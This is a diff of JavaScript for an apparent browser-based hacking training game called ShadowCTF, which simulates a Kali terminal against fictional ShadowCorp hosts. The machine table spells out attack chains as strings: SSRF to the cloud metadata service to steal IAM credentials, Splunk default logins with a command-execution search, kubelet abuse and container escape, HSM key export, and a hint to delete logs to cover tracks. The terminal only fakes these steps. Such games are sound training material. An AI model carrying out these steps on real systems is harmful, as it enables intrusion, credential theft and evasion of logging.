+    drops:[{name:'veeam_creds.txt',icon:'&#128196;',content:'CVE-2023-27532 dump:\n\n{"host":"192.168.1.10","user":"backup_svc","pass":"Backupp@ss!"}\n{"host":"10.10.0.50","user":"domain_backup","pass":"D0m@inB4ck!"}\n{"host":"10.10.0.20","user":"prod_backup","pass":"Pr0dB4ck!2024"}\n{"host":"192.168.1.51","user":"nas_backup","pass":"NASb4ckup!"}\n\nAll 23 backup jobs exposed.\nNEXT: aws ec2 (use keys)'}]
+ },
+ /* T8 */ {id:'ec2',ip:'54.210.x.x',host:'ec2.shadowcorp.io',name:'AWS EC2 Instance',os:'Amazon Linux 2',rdp:false,
+    ports:'22/ssh 80/http 8080/app',vuln:'SSRF -> IMDSv1 -> IAM role abuse',
+    flag:'FLAG{AWS_IMDSv1_1AM_4bus3}',
+    steps:['cat s3_env.txt — confirm AWS keys','aws ec2 describe-instances — find EC2 IPs','curl http://<ec2-ip>/api?url=http://169.254.169.254/latest/meta-data/','Extract IAM role credentials from response'],
+    requires:['aws_key','aws_secret'],
+    hints:['AWS keys from s3_env.txt or aws_keys.txt','EC2 app has SSRF at /api?url=','Pivot: SSRF to IMDSv1 http://169.254.169.254'],
+    unlockMsg:'&#128275; EC2 IAM role abused! Full AWS account access.',
+    drops:[{name:'ec2_iam.txt',icon:'&#128196;',content:'IMDSv1 SSRF:\nRole: shadowcorp-ec2-admin\nAccessKeyId: ASIA...TEMP (expires 6h)\n\nIAM permissions:\n  ec2:* — all EC2 actions\n  s3:* — all S3 buckets\n  iam:* — create/delete users\n\naws iam list-users -> 47 users\nNEXT: splunk.shadow.corp (10.10.0.70)'}]
+ },
+ /* T9 */ {id:'splunk',ip:'10.10.0.70',host:'siem.shadow.corp',name:'SIEM (Splunk)',os:'RHEL 8',rdp:false,
+    ports:'8000/splunk 8089/mgmt 9997/forward',vuln:'Default creds admin:changeme + search RCE',
+    flag:'FLAG{SPLunk_D3fault_CR3ds}',
+    steps:['cat dc_dump.txt — confirm internal access','curl http://10.10.0.70:8000 — confirm Splunk','splunk login admin:changeme','Splunk search: | eval x=system("id") | table x'],
+    requires:['splunk_pass'],
+    hints:['Splunk default creds: admin / changeme','After login try RCE via search: | eval x=system("id")','Cover tracks: delete index=main after dump'],
+    unlockMsg:'&#128275; Splunk owned! All security logs accessible.',
+    drops:[{name:'splunk_loot.txt',icon:'&#128196;',content:'Splunk admin:changeme -> login\n\nRCE: | eval x=system("id") -> uid=splunk\n\nSecurity logs (last 24h):\n  47 hosts reporting\n  0 alerts triggered (attacker invisible)\n\nLogs deleted from index=main\n\nNEXT: 10.10.0.80 (HSM)'}]
+ },
+ /* T9 */ {id:'hsm',ip:'10.10.0.80',host:'hsm.shadow.corp',name:'HSM (SafeNet Luna)',os:'SafeNet Luna 7',rdp:false,
+    ports:'22/ssh 1792/ntls 8443/admin',vuln:'Default PIN (1234) + private key export',
+    flag:'FLAG{HSM_K3y_3xtr4ct}',
+    steps:['cat splunk_loot.txt — confirm HSM reachable','curl https://10.10.0.80:8443/admin — HSM web UI','hsm pin 1234 — authenticate with default PIN','hsm export — export all key material'],
+    requires:['hsm_pin'],
+    hints:['HSM reachable after Splunk compromise','Default PIN is 1234 (never changed)','Export command: hsm export'],
+    unlockMsg:'&#128275; HSM keys extracted! Code signing certs + master keys stolen.',
+    drops:[{name:'hsm_keys.txt',icon:'&#128196;',content:'SafeNet Luna 7 PIN 1234 accepted.\n\nExported:\n  code_signing.p12  (ShadowCorp CA cert)\n  ssl_wildcard.pem  (*.shadowcorp.com)\n  encryption_master.key (AES-256)\n  payment_signing.p12 (PCI-DSS cert)\n\nAll HTTPS decryptable.\nAll binaries signable as ShadowCorp.\nNEXT: 10.10.0.100 (final boss)'}]
+ },
+ /* T9 */ {id:'cloud-c2',ip:'185.220.x.x',host:'c2.shadow.io',name:'C2 Server',os:'Ubuntu 22.04',rdp:false,
+    ports:'443/https 4444/c2 8443/panel',vuln:'Cobalt Strike panel default password',
+    flag:'FLAG{C2_P4n3l_0wn3d}',
+    steps:['cat ec2_iam.txt — find C2 server reference','curl https://185.220.x.x:8443 — Cobalt Strike panel','Login: admin / CobaltStrike! (default)','Download beacon configs — expose all implants'],
+    requires:['aws_key'],
+    hints:['C2 IP found after EC2 compromise','Cobalt Strike default panel password','Beacon configs reveal all compromised hosts'],
+    unlockMsg:'&#128275; C2 panel owned! All implants exposed.',
+    drops:[{name:'c2_beacons.txt',icon:'&#128196;',content:'Cobalt Strike panel:\nadmin:CobaltStrike! -> access granted\n\nActive beacons:\n  192.168.1.50 (WIN-WS01) -> sleep 60s\n  10.10.0.20 (prod-server) -> sleep 30s\n  10.10.0.40 (staging) -> sleep 10s\n  192.168.1.14 (vb-forum) -> sleep 120s\n\nAll C2 traffic now visible.\nNEXT: 10.10.0.100 (shadow root)'}]
+ },
+ /* T9 */ {id:'git',ip:'10.10.0.90',host:'git.shadow.corp',name:'GitLab Server',os:'Ubuntu 20.04',rdp:false,
+    ports:'22/ssh 80/http 443/https',vuln:'GitLab CVE-2021-22205 (unauthenticated RCE)',
+    flag:'FLAG{G1tL4b_RC3_0wn3d}',
+    steps:['nmap 10.10.0.90 — confirm GitLab','curl http://10.10.0.90 — check version (14.x vulnerable)','python3 exploits/gitlab_rce.py 10.10.0.90','cat /etc/gitlab/gitlab-secrets.json'],
+    requires:['dc_ntlm'],
+    hints:['GitLab 14.x has unauthenticated RCE via image upload','gitlab_rce.py handles the exploit','gitlab-secrets.json has all tokens + DB passwords'],
+    unlockMsg:'&#128275; GitLab RCE! Source code + secrets exfiltrated.',
+    drops:[{name:'gitlab_secrets.txt',icon:'&#128196;',content:'gitlab-secrets.json:\n\ndb_key_base: abc123shadow...\notp_key_base: shadow_otp_key\njws_private_key: -----BEGIN RSA-----\n\nRepositories:\n  shadow-corp/production (private)\n  shadow-corp/infrastructure (Terraform)\n  shadow-corp/secrets (!!)\n\nNEXT: cat shadow-corp/secrets repo'}]
+ },
+ /* T9 */ {id:'k8s',ip:'10.10.0.95',host:'k8s.shadow.corp',name:'Kubernetes Cluster',os:'k8s 1.24',rdp:false,
+    ports:'6443/k8s-api 10250/kubelet 8443/dashboard',vuln:'Exposed kubelet API (no auth) + privileged pod escape',
+    flag:'FLAG{K8s_Cl5t3r_0wn3d}',
+    steps:['cat gitlab_secrets.txt — find kubeconfig','curl https://10.10.0.95:10250/pods — unauthenticated kubelet','kubectl --token=<stolen> exec -it pod -- /bin/bash','Mount host filesystem: hostPath escape'],
+    requires:['dc_ntlm'],
+    hints:['Kubelet API at :10250 often unauthenticated','kubectl exec into any running pod','Privileged pod: mount host / and chroot'],
+    unlockMsg:'&#128275; Kubernetes cluster owned! All pods + secrets compromised.',
+    drops:[{name:'k8s_secrets.txt',icon:'&#128196;',content:'Kubelet exploit:\ncurl https://10.10.0.95:10250/pods -> pod list\nkubectl exec -> shell in prod pod\n\nk8s secrets:\n  shadowcorp/db-creds: postgres://admin:K8s_DB_P4ss!\n  shadowcorp/jwt-secret: k8s_jwt_s3cr3t\n  shadowcorp/aws-creds: (same as extracted)\n\nhostPath escape:\n  chroot /host -> node compromise\nNEXT: 10.10.0.100 (final boss)'}]
+ },
+ /* T10 */ {id:'final',ip:'10.10.0.100',host:'shadow-root.shadow.corp',name:'Shadow Root — FINAL BOSS',os:'Arch Linux (hardened)',rdp:false,
+    ports:'22/ssh 31337/c2 65535/backdoor',vuln:'Custom crypto backdoor + kernel rootkit removal',
+    flag:'FLAG{Sh4d0w_R00t_F1n4l_B0ss}',
+    steps:['cat hsm_keys.txt — get encryption_master.key','cat c2_beacons.txt OR k8s_secrets.txt — confirm server','nc 10.10.0.100 31337 — connect to backdoor service','Provide master key to unlock: echo encryption_master.key | nc 10.10.0.100 31337'],
+    requires:['final_key'],
+    hints:['Need hsm_keys.txt (encryption_master.key) to unlock backdoor','nc 10.10.0.100 31337 — connect to the service','Send the master key to get root shell'],
+    unlockMsg:'&#127881; ALL 45 MACHINES PWNED. ShadowCTF complete! You are the Shadow.',
+    drops:[{name:'FINAL_FLAG.txt',icon:'&#127942;',content:'=== SHADOWCORP FULLY COMPROMISED ===\n\nComplete attack chain:\n  External -> DMZ -> Internal\n  -> OT/SCADA -> Cloud -> AD Domain\n  -> Mainframe -> Final Boss\n\n45/45 machines owned.\n\n"In the world of cybersecurity,\nthe best offense is understanding\nevery layer of defense."\n\n    -- ShadowCTF Team 2024\n\nYou are now the Shadow.'}]
+ }
+];
+
+/* ═══════════════════════════════════════════════
+   LOOT DISCOVERY — when player runs specific commands,
+   they discover loot that unlocks future machines
+═══════════════════════════════════════════════ */
+function discoverLoot(key) {
+  if (G.loot[key]) return; // already have it
+  G.loot[key] = LOOT_KEYS[key];
+}
+
+function hasLoot(key) {
+  return !!G.loot[key];
+}
+
+function checkRequires(mIdx) {
+  var m = M[mIdx];
+  if (!m.requires || m.requires.length === 0) return true;
+  for (var i = 0; i < m.requires.length; i++) {
+    if (!hasLoot(m.requires[i])) return false;
+  }
+  return true;
+}
+
+/* ═══════════════════════════════════════════════
+   BOOT
+═══════════════════════════════════════════════ */
+var BOOT=[
+  {t:'[    0.000000] Linux version 6.8.0-kali1-amd64 (gcc 13.2.0)',c:'bd',d:0},
+  {t:'[    0.253412] ACPI: IRQ0 override.',c:'bd',d:18},
+  {t:'[    0.841203] Spectre V2: Restricted Speculation enabled',c:'bw',d:38},
+  {t:'[    1.832049] random: crng init done',c:'bk',d:38},
+  {t:'[    2.014837] EXT4-fs (sda1): mounted filesystem',c:'bk',d:35},
+  {t:'',d:12},
+  {t:'         Starting shadowlab...',c:'bb2',d:70},
+  {t:'[  OK  ] Started Journal Service.',c:'bk',d:40},
+  {t:'[  OK  ] Reached target Network — eth0: 192.168.1.100/24',c:'bk',d:45},
+  {t:'[  OK  ] wlan0: monitor mode enabled',c:'bk',d:35},
+  {t:'[  OK  ] Metasploit | sqlmap | aircrack-ng | impacket',c:'bk',d:45},
+  {t:'',d:18},
+  {t:'         ShadowCTF Engine v5.0',c:'bk',d:70},
+  {t:'[  OK  ] 45 targets | multi-step exploitation required',c:'bk',d:45},
+  {t:'[ WARN ] ASLR disabled | lab mode active',c:'bw',d:40},
+  {t:'[ INFO ] Each flag requires discovering loot from previous machines',c:'bd',d:45},
+  {t:'',d:30},
+  {t:'shadowlab login:',c:'bf',d:60}
+];
+
+function runBoot(){
+  var out=document.getElementById('bout');var delay=0;var done=false;
+  function go(){if(done)return;done=true;showScr('scr-login');setTimeout(function(){try{$('linp').focus();}catch(e){}},300);}
+  BOOT.forEach(function(e){setTimeout(function(){var d=document.createElement('div');d.className='bl '+e.c;d.textContent=e.t;out.appendChild(d);out.scrollTop=out.scrollHeight;},delay);delay+=(e.d||22);});
+  setTimeout(go,delay+300);setTimeout(go,9000);
+}
+
+/* ═══════════════════════════════════════════════
+   UTILS
+═══════════════════════════════════════════════ */
+function $(id){return document.getElementById(id);}
+function showScr(id){document.querySelectorAll('.scr').forEach(function(s){s.classList.remove('on');});$(id).classList.add('on');var onD=(id==='scr-desk');document.querySelectorAll('.dico,.dfil').forEach(function(e){e.style.visibility=onD?'visible':'hidden';});}
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function updateClock(){var d=new Date();$('pclk').textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0');}
+
+function notify(msg,type){
+  var n=$('notif'),d=document.createElement('div');
+  d.className='nitem'+(type?' '+type:'');d.innerHTML=msg;n.appendChild(d);
+  setTimeout(function(){if(d.parentNode)d.parentNode.removeChild(d);},4500);
+}
+
+function burst(x,y){
+  ['&#10024;','&#127775;','&#9889;','&#128512;'].forEach(function(em,i){
+    var d=document.createElement('div');d.className='burst';d.innerHTML=em;
+    var tx=(Math.random()-.5)*120,ty=-(Math.random()*80+40);
+    d.style.cssText='left:'+x+'px;top:'+y+'px;--tx:'+tx+'px;--ty:'+ty+'px;';
+    document.body.appendChild(d);setTimeout(function(){if(d.parentNode)d.parentNode.removeChild(d);},800);
+  });
+}
+
+function updateProgress(){
+  var n=Object.keys(G.flags).length,total=M.length;
+  $('pfill').style.width=Math.round(n/total*100)+'%';
+  $('pflags').textContent='\u2691 '+n+'/'+total;
+  var mc=$('mcount');if(mc)mc.textContent=n;
+}
+
+function machineUnlocked(idx){return idx<=G.unlocked;}
+
+function getMachineIdx(str){
+  str=(str||'').toLowerCase();
+  for(var i=0;i<M.length;i++){
+    if(str.includes(M[i].ip)||str.includes(M[i].host.split(':')[0].toLowerCase())||str.includes(M[i].id)) return i;
+  }
+  return -1;
+}
+
+/* ═══════════════════════════════════════════════
+   FLAG CAPTURE
+═══════════════════════════════════════════════ */
+function captureFlag(flagStr,ex,ey){
+  if(G.flags[flagStr])return;
+  G.flags[flagStr]=true;
+  updateProgress();
+  var mIdx=-1;
+  for(var i=0;i<M.length;i++){if(M[i].flag===flagStr){mIdx=i;break;}}
+  tLine('<span class="fline">[+] FLAG: '+esc(flagStr)+'</span>');
+  if(ex)burst(ex,ey||200);
+  notify('[+] '+flagStr,'');
+  if(mIdx>=0){
+    M[mIdx].drops.forEach(function(f){addDesktopFile(f);});
+    if(mIdx+1>G.unlocked){
+      G.unlocked=mIdx+1;
+      setTimeout(function(){
+        notify(M[mIdx].unlockMsg,'ul');
+        tLine('<span class="y">[UNLOCK] '+esc(M[mIdx].unlockMsg)+'</span>');
+        renderBrowserLinks();renderMissions();renderDeskIcons();
+      },700);
+    }
+  }
+  renderMissions();
+}
+
+/* ═══════════════════════════════════════════════
+   DESKTOP ICON DRAG
+═══════════════════════════════════════════════ */
+var DRAG={el:null,sx:0,sy:0,ox:0,oy:0,moved:false,isFile:false,idx:-1};
+function makeDraggable(el){el.addEventListener('pointerdown',onDS,{passive:false});}
+function onDS(e){
+  DRAG.el=e.currentTarget;DRAG.sx=e.clientX;DRAG.sy=e.clientY;
+  DRAG.ox=parseInt(DRAG.el.style.left)||0;DRAG.oy=parseInt(DRAG.el.style.top)||0;
+  DRAG.moved=false;DRAG.isFile=DRAG.el.classList.contains('dfil');DRAG.idx=parseInt(DRAG.el.dataset.idx);
+  DRAG.el.setPointerCapture(e.pointerId);DRAG.el.classList.add('dragging');e.preventDefault();
+}
+document.addEventListener('pointermove',function(e){
+  if(!DRAG.el)return;
+  var dx=e.clientX-DRAG.sx,dy=e.clientY-DRAG.sy;
+  if(Math.abs(dx)>4||Math.abs(dy)>4)DRAG.moved=true;
+  if(!DRAG.moved)return;
+  var W=window.innerWidth,H=window.innerHeight;
+  var nx=Math.max(0,Math.min(W-74,DRAG.ox+dx));
+  var ny=Math.max(26,Math.min(H-80,DRAG.oy+dy));
+  DRAG.el.style.left=nx+'px';DRAG.el.style.top=ny+'px';
+  var pos={left:nx,top:ny};
+  if(DRAG.isFile){if(G.deskFiles[DRAG.idx])G.deskFiles[DRAG.idx].pos=pos;}
+  else{if(G.deskIcons[DRAG.idx])G.deskIcons[DRAG.idx].pos=pos;}
+});
+document.addEventListener('pointerup',function(e){
+  if(!DRAG.el)return;
+  var el=DRAG.el;el.classList.remove('dragging');
+  if(!DRAG.moved)handleTap(el,DRAG.isFile,DRAG.idx,e.clientX,e.clientY);
+  DRAG.el=null;
+},{passive:true});
+
+var _tap={el:null,t:0};
+function handleTap(el,isFile,idx,cx,cy){
+  var now=Date.now();
+  if(_tap.el===el&&now-_tap.t<450){
+    _tap.el=null;
+    if(isFile)openDesktopFile(idx);else{var ico=G.deskIcons[idx];if(ico)ico.action();}
+    document.querySelectorAll('.dico.sel,.dfil.sel').forEach(function(e){e.classList.remove('sel');});
+  } else {
+    _tap.el=el;_tap.t=now;
+    document.querySelectorAll('.dico.sel,.dfil.sel').forEach(function(e){e.classList.remove('sel');});
+    el.classList.add('sel');
+  }
+}
+
+/* ═══════════════════════════════════════════════
+   APP ICONS
+═══════════════════════════════════════════════ */
+var APP_ICONS=[
+  {id:'terminal',em:'&#x2B1B;',label:'Terminal',action:function(){openWin('terminal');}},
+  {id:'browser', em:'&#127760;',label:'Firefox', action:function(){openWin('browser');}},
+  {id:'files',   em:'&#128193;',label:'Files',   action:function(){openWin('files');}},
+  {id:'proxy',   em:'&#128269;',label:'Burp',    action:function(){openWin('proxy');}},
+  {id:'wifi',    em:'&#128246;',label:'Airodump',action:function(){openWin('wifi');}},
+  {id:'missions',em:'&#127919;',label:'Missions',action:function(){openWin('missions');}},
+  {id:'rdp',     em:'&#128421;',label:'RDP',     action:function(){openWin('rdp');}}
+];
+
+function renderDeskIcons(){
+  document.querySelectorAll('.dico').forEach(function(e){e.remove();});
+  var W=window.innerWidth||360;
+  APP_ICONS.forEach(function(ico,i){
+    if(!G.deskIcons[i]){G.deskIcons[i]={id:ico.id,action:ico.action,pos:{left:W-82,top:32+i*76}};}
+    else{G.deskIcons[i].action=ico.action;}
+    var pos=G.deskIcons[i].pos;
+    var el=document.createElement('div');el.className='dico';el.dataset.idx=String(i);
+    el.style.cssText='position:fixed;left:'+pos.left+'px;top:'+pos.top+'px;width:76px;z-index:100;';
+    el.innerHTML='<span class="dico-em">'+ico.em+'</span><span class="dico-label">'+ico.label+'</span>';
+    el.addEventListener('contextmenu',function(e){e.preventDefault();G.ctxTarget={isFile:false,idx:i,name:ico.label};showCtx(e.clientX,e.clientY,'app');});
+    makeDraggable(el);document.body.appendChild(el);
+  });
+}
+
+function renderDeskFiles(){
+  document.querySelectorAll('.dfil').forEach(function(e){e.remove();});
+  G.deskFiles.forEach(function(f,i){
+    if(!f.pos){f.pos={left:8,top:32+(i%12)*72};}
+    var el=document.createElement('div');el.className='dfil'+(f.isNew?' dfil-new':'');el.dataset.idx=String(i);
+    el.style.cssText='position:fixed;left:'+f.pos.left+'px;top:'+f.pos.top+'px;width:64px;z-index:100;';
+    el.innerHTML='<span class="dfil-em">'+f.icon+'</span><span class="dfil-label">'+esc(f.name)+'</span>';
+    f.isNew=false;
+    el.addEventListener('contextmenu',function(e){e.preventDefault();G.ctxTarget={isFile:true,idx:i,name:f.name};showCtx(e.clientX,e.clientY,'file');});
+    makeDraggable(el);document.body.appendChild(el);
+  });
+}
+
+function addDesktopFile(f){
+  for(var i=0;i<G.deskFiles.length;i++){if(G.deskFiles[i].name===f.name)return;}
+  f.isNew=true;f.pos=null;G.deskFiles.push(f);renderDeskFiles();
+}
+
+function openDesktopFile(idx){var f=G.deskFiles[idx];if(!f)return;$('fvname').textContent=f.name;$('fvcontent').textContent=f.content;$('fv').classList.add('on');}
+function closeFV(){$('fv').classList.remove('on');}
+
+/* Context menu */
+function showCtx(x,y,type){var ctx=$('ctx');$('ctx-open').textContent=type==='file'?'Open':'Launch';ctx.style.left=Math.min(x,window.innerWidth-140)+'px';ctx.style.top=Math.min(y,window.innerHeight-100)+'px';ctx.classList.add('on');}
+document.addEventListener('click',function(e){var c=$('ctx');if(c&&!c.contains(e.target))c.classList.remove('on');});
+function ctxAction(act){$('ctx').classList.remove('on');var t=G.ctxTarget;if(!t)return;if(act==='open'){if(t.isFile)openDesktopFile(t.idx);else{var ico=G.deskIcons[t.idx];if(ico)ico.action();}}else if(act==='delete'&&t.isFile){G.deskFiles.splice(t.idx,1);renderDeskFiles();}}
+
+/* ═══════════════════════════════════════════════
+   LOGIN
+═══════════════════════════════════════════════ */
+$('linp').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
+function doLogin(){
+  var p=$('linp').value,ok=false,ks=Object.keys(CREDS);
+  for(var i=0;i<ks.length;i++){if(CREDS[ks[i]]===p){ok=true;break;}}
+  if(ok){showScr('scr-desk');initDesktop();}
+  else{$('lerr').textContent='Wrong password.';$('linp').value='';setTimeout(function(){$('lerr').textContent='';},2500);}
+}
+
+/* ═══════════════════════════════════════════════
+   DESKTOP INIT
+═══════════════════════════════════════════════ */
+function initDesktop(){
+  updateClock();setInterval(updateClock,30000);
+  buildFileTree();renderMissions();initProxy();renderBrowserLinks();
+  renderDeskIcons();renderDeskFiles();
+  openWin('terminal');
+  tLine('<span class="d">Linux kali 6.8.0-kali1-amd64 #1 SMP x86_64</span>');tBlank();
+  tLine('<span class="p">  ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗</span>');
+  tLine('<span class="p">  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║</span>');
+  tLine('<span class="p">  ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║</span>');
+  tLine('<span class="p">  ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║</span>');
+  tLine('<span class="p">  ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝</span>');tBlank();
+  tLine('<span class="b">  ShadowCTF v5.0</span>  <span class="d">45 machines | multi-step exploitation</span>');tBlank();
+  tLine('<span class="y">  [!] First target: nmap 192.168.1.0/24</span>');
+  tLine('<span class="d">  Each flag requires credentials from previous machines.</span>');
+  tLine('<span class="d">  Type </span><span class="y">help</span><span class="d"> for commands. Desktop icons: drag to move, double-tap to open.</span>');tBlank();
+}
+
+/* Panel + windows */
+function toggleMenu(){$('amenu').classList.toggle('on');$('pmb').classList.toggle('open');}
+function closeMenu(){$('amenu').classList.remove('on');$('pmb').classList.remove('open');}
+document.addEventListener('click',function(e){var m=$('pmb');if(m&&!m.contains(e.target))closeMenu();});
+function openWin(name){document.querySelectorAll('.wovl.on').forEach(function(o){if(o.id!=='wovl-'+name)o.classList.remove('on');});var o=$('wovl-'+name);if(o)o.classList.add('on');document.querySelectorAll('.pab').forEach(function(b){b.classList.remove('act');});var pb=$('pa-'+name);if(pb)pb.classList.add('act');if(name==='terminal')setTimeout(function(){try{$('tinp').focus();}catch(e){}},150);if(name==='browser'&&!$('bpage').innerHTML)navBrowser();}
+function closeWin(name){var o=$('wovl-'+name);if(o)o.classList.remove('on');}
+document.querySelectorAll('.wovl').forEach(function(o){o.addEventListener('click',function(e){if(e.target===o)o.classList.remove('on');});});
+window.addEventListener('resize',function(){if($('scr-desk').classList.contains('on')){G.deskIcons=[];renderDeskIcons();renderDeskFiles();}});
+
+/* ═══════════════════════════════════════════════
+   TERMINAL
+═══════════════════════════════════════════════ */
+function tLine(html){var out=$('tout'),d=document.createElement('div');d.style.cssText='margin:0;line-height:1.5;word-break:break-word;';d.innerHTML=html;out.appendChild(d);out.scrollTop=out.scrollHeight;}
+function tText(text,cls){tLine('<span class="'+(cls||'f')+'">'+esc(text)+'</span>');}
+function tBlank(){tLine('');}
+function tHint(text){tLine('<div class="hint-box">'+esc(text)+'</div>');}
+
+$('tinp').addEventListener('keydown',function(e){
+  if(e.key!=='Enter')return;
+  var cmd=e.target.value.trim();e.target.value='';if(!cmd)return;
+  tLine('<span class="g">root</span><span class="d">@</span><span class="ph">kali</span><span class="d">:</span><span class="b">'+esc(G.cwd)+'</span><span class="f"># '+esc(cmd)+'</span>');
+  runCmd(cmd);
+});
+
+function runCmd(raw){
+  var parts=raw.trim().split(/\s+/),c=parts[0].toLowerCase(),args=parts.slice(1),a=args.join(' ');
+  switch(c){
+    case 'help':
+      tBlank();
+      tText('Network:    nmap  ping  traceroute  dig  whois','b');
+      tText('Exploit:    sqlmap  curl  wget  ssh  ftp  telnet','b');
+      tText('            hydra  john  aircrack-ng  gcc  python3','b');
+      tText('            impacket-psexec  crackmapexec  snmpwalk','b');
+      tText('            splunk  hsm  s7comm  openvpn  aws  nc','b');
+      tText('System:     ls  cat  cd  pwd  ps  ifconfig  uname','b');
+      tText('Lab:        targets  missions  hint <1-33>  loot  rdp <ip>','b');
+      tBlank();
+      tText('[!] Multi-step: each machine requires loot from previous ones.','y');
+      tText('    Type "loot" to see discovered credentials.','d');
+      tBlank();break;
+    case 'clear':$('tout').innerHTML='';break;
+    case 'whoami':tText('root','g');break;
+    case 'id':tText('uid=0(root) gid=0(root) groups=0(root)');break;
+    case 'pwd':tText(G.cwd==='~'?'/root':G.cwd);break;
+    case 'uname':tText('Linux kali 6.8.0-kali1-amd64 #1 SMP x86_64 GNU/Linux');break;
+    case 'ifconfig':tBlank();tText('eth0: inet 192.168.1.100  netmask 255.255.255.0');tText('wlan0: monitor mode  ether aa:bb:cc:dd:ee:ff');tBlank();break;
+    case 'ps':tText('  PID TTY    TIME CMD','d');tText('    1 ?   00:01 systemd');tText('  312 ?   00:00 sshd');tText(' 1337 ?   00:15 shadowctf-engine');break;
+    case 'loot':doLoot();break;
+    case 'ls':doLs(args[0]||'');break;
+    case 'cd':doCd(args[0]||'~');break;
+    case 'cat':doCat(a);break;
+    case 'nmap':doNmap(a);break;
+    case 'ping':doPing(args[0]||'');break;
+    case 'ssh':doSSH(a);break;
+    case 'ftp':doFTP(args[0]||'');break;
+    case 'telnet':doTelnet(a);break;
+    case 'curl':doCurl(a);break;
+    case 'wget':doWget(a);break;
+    case 'sqlmap':doSqlmap(a);break;
+    case 'hydra':doHydra(a);break;
+    case 'john':doJohn(a);break;
+    case 'aircrack-ng':doAircrack(a);break;
+    case 'gcc':doGcc(a);break;
+    case 'python3':doPython(a);break;
+    case 'impacket-psexec':case 'psexec':doPsexec(a);break;
+    case 'crackmapexec':case 'cme':doCME(a);break;
+    case 'snmpwalk':case 'snmp':doSNMP(a);break;
+    case 'openvpn':case 'vpn':doVPN(a);break;
+    case 'aws':doAWS(a);break;
+    case 'splunk':doSplunk(a);break;
+    case 'hsm':case 'pkcs11':doHSM(a);break;
+    case 's7comm':case 'plcsim':case 'snap7':doPLC(a);break;
+    case 'nc':case 'netcat':doNC(a);break;
+    case 'rdp':case 'xfreerdp':doRDP(args[0]||'');break;
+    case 'targets':doTargets();break;
+    case 'missions':openWin('missions');break;
+    case 'hint':
+      var n=parseInt(args[0]);
+      if(n>=1&&n<=M.length){
+        G.hintsOn=true;var mm=M[n-1];tBlank();
+        tText('[Hint M'+n+': '+mm.name+']','y');
+        tText('  Vuln: '+mm.vuln,'g');
+        mm.hints.forEach(function(h){tText('  * '+h,'d');});
+        if(mm.requires.length){tText('  Requires loot: '+mm.requires.join(', '),'c');}
+        tBlank();renderMissions();
+      } else tText('Usage: hint <1-33>','r');
+      break;
+    case 'exploits':
+      tBlank();tText('/root/exploits/','b');
+      tText('-rwxr-xr-x  sqlmap/          (installed)');
+      tText('-rwxr-xr-x  buffer_overflow.c');
+      tText('-rwxr-xr-x  jwt_forge.py');
+      tText('-rwxr-xr-x  race_condition.py');
+      tText('-rwxr-xr-x  drupalgeddon2.py');
+      tText('-rwxr-xr-x  eternalblue.py');
+      tText('-rwxr-xr-x  gitlab_rce.py');
+      tText('-rwxr-xr-x  dcsync.py');tBlank();break;
+    case 'kubectl':
+    case 'k8s':
+      if(!G.loot['dc_ntlm']){tText('[!] Need domain compromise to reach k8s.shadow.corp','r');break;}
+      tText('[*] kubectl exec via unauthenticated kubelet...','d');
+      setTimeout(function(){tText('[+] Pod shell obtained','y');tText('[+] hostPath escape -> node root','y');captureFlag('FLAG{K8s_Cl5t3r_0wn3d}');tBlank();},1200);
+      break;
+    default:tText('bash: '+c+': command not found. Type help','r');
+  }
+}
+
+/* Loot display */
+function doLoot(){
+  tBlank();tText('=== DISCOVERED LOOT ===','b');
+  var keys=Object.keys(G.loot);
+  if(!keys.length){tText('(none yet — exploit machines to discover credentials)','d');}
+  else{keys.forEach(function(k){tLine('<span class="g">'+esc(k)+'</span> = <span class="y">'+esc(G.loot[k])+'</span>');});}
+  tBlank();
+}
+
+/* ls */
+function doLs(path){
+  var p=(path||G.cwd).toLowerCase();tBlank();
+  if(!path||p==='~'||p==='/root'){
+    tLine('<span class="b">exploits/</span>  <span class="b">loot/</span>  <span class="b">wordlists/</span>  <span class="g">notes.txt</span>  <span class="g">scope.txt</span>');
+  } else if(p.includes('exploit')){
+    tLine('<span class="g">buffer_overflow.c</span>  <span class="g">jwt_forge.py</span>  <span class="g">race_condition.py</span>');
+    tLine('<span class="g">drupalgeddon2.py</span>  <span class="g">eternalblue.py</span>  <span class="g">gitlab_rce.py</span>');
+  } else if(p.includes('wordlist')){tText('rockyou.txt (14.3M)  darkweb2024.txt  common.txt');}
+  else if(p.includes('loot')){
+    var lk=Object.keys(G.loot);
+    if(lk.length)lk.forEach(function(k){tText(k+'.txt');});
+    else tText('(empty — capture flags)','d');
+  } else {tText('ls: '+path+': No such file or directory','r');}
+  tBlank();
+}
+
+function doCd(path){
+  if(path==='~'||path==='/root'){G.cwd='~';}
+  else if(path==='exploits'||path==='./exploits'){G.cwd='~/exploits';}
+  else if(path==='..'||path==='.'){G.cwd='~';}
+  else{tText('bash: cd: '+path+': No such file or directory','r');return;}
+  $('tcwd').textContent=G.cwd;
+}
+
+/* cat — reads desktop files + known files */
+function doCat(f){
+  var fl=f.toLowerCase();tBlank();
+  // Check desktop dropped files first
+  for(var i=0;i<G.deskFiles.length;i++){
+    if(G.deskFiles[i].name.toLowerCase()===fl||'/root/'+G.deskFiles[i].name.toLowerCase()===fl){
+      tText(G.deskFiles[i].content);tBlank();return;
+    }
+  }
+  if(fl==='notes.txt'||fl==='~/notes.txt'){
+    tText('# Engagement Notes','y');
+    tText('- Start: nmap 192.168.1.0/24');
+    tText('- Use "loot" command to see discovered credentials');
+    tText('- Check desktop files after each compromise');
+    tText('- Each machine needs creds from previous machines');
+    tText('- Type "missions" to see full step-by-step guide');
+  } else if(fl==='scope.txt'){
+    tText('# In-Scope targets:','y');
+    tText('192.168.1.0/24  — DMZ network');
+    tText('10.10.0.0/24    — Internal servers (pivot required)');
+    tText('10.10.1.0/24    — VPN/Network infra');
+    tText('10.10.2.0/24    — Management (pivot required)');
+    tText('172.16.0.0/24   — OT/SCADA (VPN required)');
+    tText('10.99.0.0/24    — Security (route via mgmt)');
